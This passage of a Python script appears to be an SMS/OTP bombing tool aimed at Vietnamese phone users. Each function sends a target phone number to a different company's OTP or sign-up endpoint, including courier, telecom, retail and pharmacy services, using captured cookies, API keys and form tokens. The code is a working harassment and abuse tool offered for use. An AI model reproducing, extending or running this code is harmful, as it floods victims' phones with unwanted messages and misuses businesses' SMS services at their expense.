        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    params = {
        'code': 'fc9da32a48e6298d54a7a81dbbbcff50',
        'instanceId': '4fc17ac7-654b-406a-847b-efc9b7171ffa',
        'validate': '921c7b9ec5502202ec88625cb96b913e',
    }

    json_data = {
        'phoneNumber': sdt,
        'verificationCodeType': 1,
    }

    try:
        response = requests.post('https://v9-cc.800best.com/uc/account/sendSignUpCode', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BESTEXPRESS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BESTEXPRESS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ghnexpress():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'priority': 'u=1, i',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'type': 'register',
    }

    try:
        response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GHNEXPRESS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GHNEXPRESS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def myviettel():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    }

    try:
        response = requests.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={sdt}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MYVIETTEL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MYVIETTEL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fptshop():
    headers = {
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'Content-Type': 'application/json',
        'Referer': 'https://fptshop.com.vn/',
        'order-channel': '1',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTSHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTSHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sapo():
    cookies = {
        'campaign': 'header_app_sapo',
        'G_ENABLED_IDPS': 'google',
        'referral': 'https://www.google.com/',
        'landing_page': 'https://www.sapo.vn/',
        'start_time': '08/09/2024 16:29:51',
        'pageview': '2',
        'source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'campaign=header_app_sapo; G_ENABLED_IDPS=google; referral=https://www.google.com/; landing_page=https://www.sapo.vn/; start_time=08/09/2024 16:29:51; pageview=2; source=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'origin': 'https://www.sapo.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        'FullName': 'PHAN HUY TAN',
        'PhoneNumber': sdt,
        'StoreName': 'VNBT',
        'CityDistrict': 'Hà Nội,01',
        'PackageType': 'pos',
        'Preferred': '',
        'SaleName': '',
        'Reference': '',
        'Source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'Referral': 'https://www.google.com/',
        'Campaign': 'header_app_sapo',
        'LandingPage': 'https://www.sapo.vn/',
        'StartTime': '08/09/2024 16:29:51',
        'EndTime': '08/09/2024 16:30:2',
        'PageView': '2',
        'AffId': '',
        'AffTrackingId': '',
        'Type': '1',
        'SalesTeam': '',
        'City': 'Hà Nội',
        'CityId': '01',
        'Province': 'Hà Nội',
        'CityNameAndId': 'Hà Nội,01',
        'SocialSource': '',
        'FacebookName': '',
        'FacebookAvatar': '',
    }

    try:
        response = requests.post('https://www.sapo.vn/consultingrequest/registertrial', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SAPO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SAPO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)   

def paynet():
    cookies = {
        '__RequestVerificationToken': 'LM7AlXTmKrjc0v16MMmt2qViZj8BIxkEyLcleS9vHijnP2kbDqJ3fWvJW2t_ecMjOgQiKmyDfITsH7270Y_w2UC_aaFnO1EZFjnbU8hGCZM1',
        'ASP.NET_SessionId': 'a50onuvzqyt4onxiosf1xnqo',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '__RequestVerificationToken=LM7AlXTmKrjc0v16MMmt2qViZj8BIxkEyLcleS9vHijnP2kbDqJ3fWvJW2t_ecMjOgQiKmyDfITsH7270Y_w2UC_aaFnO1EZFjnbU8hGCZM1; ASP.NET_SessionId=a50onuvzqyt4onxiosf1xnqo',
        'Origin': 'https://merchant.paynetone.vn',
        'Referer': 'https://merchant.paynetone.vn/User/Create',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'MobileNumber': sdt,
        'IsForget': 'N',
    }

    try:
        response = requests.post('https://merchant.paynetone.vn/User/GetOTP', cookies=cookies, headers=headers, data=data, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PAYNET | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PAYNET | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def reebok():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '0134f9fc8e5bb3de6352617eacc195a2',
        'origin': 'https://reebok.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://reebok.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721548395723',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post(
            'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("REEBOK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("REEBOK | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def gapowork():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://www.gapowork.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.gapowork.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-gapo-lang': 'vi',
    }

    json_data = {
        'phone_number': sdt,
        'device_id': '726d8613-ca37-46bd-b7af-1b79c102c0cd',
        'device_model': 'web',
    }

    try:
        response = requests.post('https://api.gapowork.vn/auth/v3.1/signup', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GAPOWORK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GAPOWORK | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def shine():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://30shine.com',
        'priority': 'u=1, i',
        'referer': 'https://30shine.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post(
            'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("30SHINE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("30SHINE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def oreka():
    cookies = {
        '__ork_u': '',
        '__ork_u_idt': '',
        '__ork_u_ph': '',
        'AWSALB': 'SFy9XJT7BhxUFBQ4oATejB5SWs7nFi4yKRr1XGUtyZt7hSmtm3VussWVf+8BHytuZUo4q6vpBbIOD79a4yOsdIXUWFx7fSfAUj0TUsaiB2hf0xr/RYavWSZxYrnK/8ghyF2Clg+zAw9nQfn7eCzjcQfgYpV+wF56nQ3sr/UCvjDwvKVc5B6ev/lq6ipVng==',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        # 'cookie': '__ork_u=; __ork_u_idt=; __ork_u_ph=; AWSALB=SFy9XJT7BhxUFBQ4oATejB5SWs7nFi4yKRr1XGUtyZt7hSmtm3VussWVf+8BHytuZUo4q6vpBbIOD79a4yOsdIXUWFx7fSfAUj0TUsaiB2hf0xr/RYavWSZxYrnK/8ghyF2Clg+zAw9nQfn7eCzjcQfgYpV+wF56nQ3sr/UCvjDwvKVc5B6ev/lq6ipVng==',
        'origin': 'https://www.oreka.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.oreka.vn/login',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-by-platform': 'PC_WEB',
    }

    json_data = {
        'variables': {
            'phone': sdt,
            'locale': 'vi',
        },
        'query': 'mutation ($phone: String!, $locale: String!) {\n  sendVerifyPhoneApp(phone: $phone, locale: $locale)\n}',
    }

    try:
        response = requests.post('https://www.oreka.vn/graphql', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("OREKA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("OREKA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fmstyle():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://fm.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fm.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
        'x-emp': '',
        'x-fromweb': 'true',
        'x-requestid': '862aab0f-2da0-4ea4-9e3d-358f619a2ad2',
    }

    json_data = {
        'Phone': sdt,
        'LatOfMap': '106',
        'LongOfMap': '108',
        'Browser': '',
    }

    try:
        response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FMSTYLE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FMSTYLE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)


def acfc():
    cookies = {
        'form_key': 'NAeTVepv8jfDGFEt',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'optiMonkClientId': '031e2e37-cd11-5d7f-bdd8-87671934b9a6',
        'optiMonkSession': '1721551346',
        'PHPSESSID': 'km715lglu45ngr7e6ubngf6f1a',
        'form_key': 'NAeTVepv8jfDGFEt',
        'private_content_version': 'd62e46921486bf21498614890d7e6251',
        'mgn_location_popup': 'southern',
        'X-Magento-Vary': '1dedfea16bd448ed11649def077bf655f8a6a95b3f3e1f559074febbe59693fc',
        'mage-cache-sessid': 'true',
        'aws-waf-token': '9ebe372d-9bac-4629-89bf-6c56fe46a184:BgoAlfE7etEyAgAA:Ov9qItJghL7JQES9NLNAtRsyuwLwfsrDWAWFXrzsZxChcKixFyRmyEVRlWBD9hO05D/g9IY+VVeV/lGsgZjEbVvzkuHAUQ9JNL/Yk16tCF1cAiLOQsoz5da1YgVsfqd/Rifxg/HRrA/PeiSv9022XH5JQN92MwBlN2/Zlwea9A+n7vBiarulYu5vWdtUpl4Que2B5ZhkfeN6sJH26VrQWJagIzZLzBq4bBfpu8KWmRMEmhYN9wEKAQ==',
        'optiMonkClient': 'N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCZIIwBmAFgjwBtjEzKJqaJY8A7APYAHVjSxYgA=',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=NAeTVepv8jfDGFEt; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; optiMonkClientId=031e2e37-cd11-5d7f-bdd8-87671934b9a6; optiMonkSession=1721551346; PHPSESSID=km715lglu45ngr7e6ubngf6f1a; form_key=NAeTVepv8jfDGFEt; private_content_version=d62e46921486bf21498614890d7e6251; mgn_location_popup=southern; X-Magento-Vary=1dedfea16bd448ed11649def077bf655f8a6a95b3f3e1f559074febbe59693fc; mage-cache-sessid=true; aws-waf-token=9ebe372d-9bac-4629-89bf-6c56fe46a184:BgoAlfE7etEyAgAA:Ov9qItJghL7JQES9NLNAtRsyuwLwfsrDWAWFXrzsZxChcKixFyRmyEVRlWBD9hO05D/g9IY+VVeV/lGsgZjEbVvzkuHAUQ9JNL/Yk16tCF1cAiLOQsoz5da1YgVsfqd/Rifxg/HRrA/PeiSv9022XH5JQN92MwBlN2/Zlwea9A+n7vBiarulYu5vWdtUpl4Que2B5ZhkfeN6sJH26VrQWJagIzZLzBq4bBfpu8KWmRMEmhYN9wEKAQ==; optiMonkClient=N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCZIIwBmAFgjwBtjEzKJqaJY8A7APYAHVjSxYgA=',
        'origin': 'https://www.acfc.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.acfc.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'number_phone': sdt,
        'form_key': 'NAeTVepv8jfDGFEt',
        'currentUrl': 'https://www.acfc.com.vn/customer/account/create/',
    }

    try:
        response = requests.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ACFC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ACFC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fptlongchauzl():
    headers = {
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Channel': 'EStore',
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://nhathuoclongchau.com.vn/',
        'order-channel': '1',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phoneNumber': '0357156321',
        'otpType': 1,
        'fromSys': 'WEBKHLC',
    }

    try:
        response = requests.post(
            'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTLONGCHAUZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTLONGCHAUZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thuocsi():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://thuocsi.vn',
        'priority': 'u=1, i',
        'referer': 'https://thuocsi.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-request-id': '1721576026076',
        'x-request-path': '/marketplace/customer/v1/register',
    }

    json_data = {
        'scope': 'DENTISTRY',
        'businessName': 'Nha khoa',
        'address': '53 et 3',
        'provinceCode': '95',
        'districtCode': '958',
        'wardCode': '31912',
        'phone': sdt,
        'referCode': '',
        'isNewFlow': True,
        'verificationCode': '',
    }

    try:
        response = requests.post('https://v2api.thuocsi.vn/marketplace/customer/v1/register', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THUOCSI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THUOCSI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pantio():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://pantio.vn',
        'priority': 'u=1, i',
        'referer': 'https://pantio.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'domain': 'pantiofashion.myharavan.com',
    }

    data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PANTIO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PANTIO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pantioresend():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://pantio.vn',
        'priority': 'u=1, i',
        'referer': 'https://pantio.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'domain': 'pantiofashion.myharavan.com',
    }

    data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/resend', params=params, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PANTIORESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PANTIORESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def winny():
    cookies = {
        'PHPSESSID': '1ead98730f607548ac0c2f370f8c2dbe',
        'X-Magento-Vary': '3ea997b53ecbf5fe274e7bf3c497ad101c488a4c',
        'form_key': 'p2sTfiaO8ihlRup7',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'form_key': 'p2sTfiaO8ihlRup7',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'mage-messages': '',
        'private_content_version': '87379c6193f6b8c7933f3a0f50cec8ef',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=1ead98730f607548ac0c2f370f8c2dbe; X-Magento-Vary=3ea997b53ecbf5fe274e7bf3c497ad101c488a4c; form_key=p2sTfiaO8ihlRup7; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; form_key=p2sTfiaO8ihlRup7; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; private_content_version=87379c6193f6b8c7933f3a0f50cec8ef',
        'origin': 'https://winny.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://winny.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'mobileNumber': sdt,
        'maxTimesToResend': '2',
        'timeAlive': '180',
        'timeCountDownToResend': '300',
        'form_key': 'p2sTfiaO8ihlRup7',
    }

    try:
        response = requests.post('https://winny.com.vn/otp/otp/send', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("WINNY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("WINNY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def owen():
    cookies = {
        'form_key': 'mVMv3IDcYvxwDHNH',
        'form_key': 'mVMv3IDcYvxwDHNH',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'PHPSESSID': 'd040280e2517e2280569a7db522d5988',
        'mage-messages': '',
        'section_data_ids': '%7B%22insiderSection%22%3A1721578899%7D',
        'private_content_version': 'a38eb3ce2c465d1e78c1d0d15bd51ee4',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
